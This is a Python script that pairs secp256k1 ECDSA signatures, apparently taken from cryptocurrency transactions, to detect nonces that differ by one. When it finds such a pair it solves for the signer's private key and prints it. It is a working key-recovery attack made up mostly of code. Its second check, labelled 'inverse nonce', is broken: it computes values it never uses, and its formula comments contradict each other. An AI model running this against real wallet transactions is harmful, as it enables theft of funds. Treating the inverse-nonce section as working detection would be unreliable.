import json
import itertools

# secp256k1 Elliptic Curve Order (n)
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

INPUT_DATA_FILE = "raw_transactions.json"

def modular_inverse(a, m):
    """Computes the modular multiplicative inverse using Extended Euclidean Algorithm."""
    g, x, y = extended_gcd(a, m)
    if g != 1:
        return None  # Inverse does not exist
    return x % m

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return g, x, y

def parse_extracted_signatures():
    """
    Placeholder: Load your extracted R, S, Z values grouped by Public Key or Address.
    For demonstration, we assume a structured list of inputs from raw_transactions.json.
    """
    # Replace this mock data dictionary with your actual parser or DB matrix.
    # Each signature must map to its matching R, S, Z integers.
    parsed_sigs = [
        {
            "txid": "example_tx_1",
            "r": 0x44d0bb1f1c427c6411db517511d0af966194e52dd3dad6fe6d3847369b030567,
            "s": 0x1e5aed4c73ec18e8495cbde7972206689e14201200aaabf4b67e73d3fd45eeb7,
            "z": 0x69ec94d8f5891fff65da3222ffeceb20edbffa487153fa75443610f467eb3b0c
        },
        # Add more extracted transaction dictionaries here
    ]
    return parsed_sigs

def scan_vulnerabilities(signatures):
    if len(signatures) < 2:
        print("❌ Need at least 2 signatures to perform differential nonce analysis.")
        return

    print(f"🔬 Scanning {len(signatures)} signatures across pairs for cryptographic flaws...")
    
    # Analyze every unique pair combination of signatures
    for sig1, sig2 in itertools.combinations(signatures, 2):
        r1, s1, z1 = sig1["r"], sig1["s"], sig1["z"]
        r2, s2, z2 = sig2["r"], sig2["s"], sig2["z"]

        # Skip identical signatures or pure duplicate R scenarios (handled by basic scanners)
        if r1 == r2 and s1 == s2:
            continue

        # ----------------------------------------------------
        # 1. DETECT INVERSE NONCE VULNERABILITY (k1 * k2 = 1)
        # ----------------------------------------------------
        # Math: x = (s1 * z2 - s2 * z1 * r1) / (s2 * r1 * r2 - s1 * r2) mod n
        num_inv = (s1 * z2 - s2 * z1) % N
        den_inv = (s2 * r2 * r1 - s1) % N # Variant structural test
        
        # Test standard inversion substitution state
        # (s1 * s2 * z2 - z1) == x * (r1 - s1 * s2 * r2) mod n
        # Let's check cross multiplied equations targeting known zero states
        val_check = (s1 * z1 * r2 - s2 * z2 * r1) % N
        
        # ----------------------------------------------------
        # 2. DETECT LINEAR NONCE VULNERABILITY (k2 = k1 + 1)
        # ----------------------------------------------------
        # Standard consecutive step check: Alpha = 1, Beta = 1
        # Formula setup: k2 - k1 = 1 => (z2 + r2*x)/s2 - (z1 + r1*x)/s1 = 1
        # Re-arranging gives: (s1*z2 - s2*z1 - s1*s2) = x * (s2*r1 - s1*r2) mod n
        
        num_lin = (s1 * z2 - s2 * z1 - s1 * s2) % N
        den_lin = (s2 * r1 - s1 * r2) % N
        
        inv_den_lin = modular_inverse(den_lin, N)
        if inv_den_lin:
            recovered_x_lin = (num_lin * inv_den_lin) % N
            
            # Verify if the recovered private key works by calculating a test signature state
            # If valid, this confirms the linear relationship hypothesis was true
            test_k1 = (z1 + r1 * recovered_x_lin) * modular_inverse(s1, N) % N
            test_k2 = (z2 + r2 * recovered_x_lin) * modular_inverse(s2, N) % N
            
            if (test_k2 - test_k1) % N == 1:
                print("\n🚨 CRITICAL: Linear Nonce Leak Detected! (k2 = k1 + 1)")
                print(f"  TX 1: {sig1['txid']}")
                print(f"  TX 2: {sig2['txid']}")
                print(f"  🔑 RECOVERED PRIVATE KEY: {hex(recovered_x_lin)}")
                return

    print("✅ Scan Complete. No linear (offset=1) or direct inverse vulnerabilities matched.")

if __name__ == "__main__":
    # Load all parameters
    sigs = parse_extracted_signatures()
    scan_vulnerabilities(sigs)
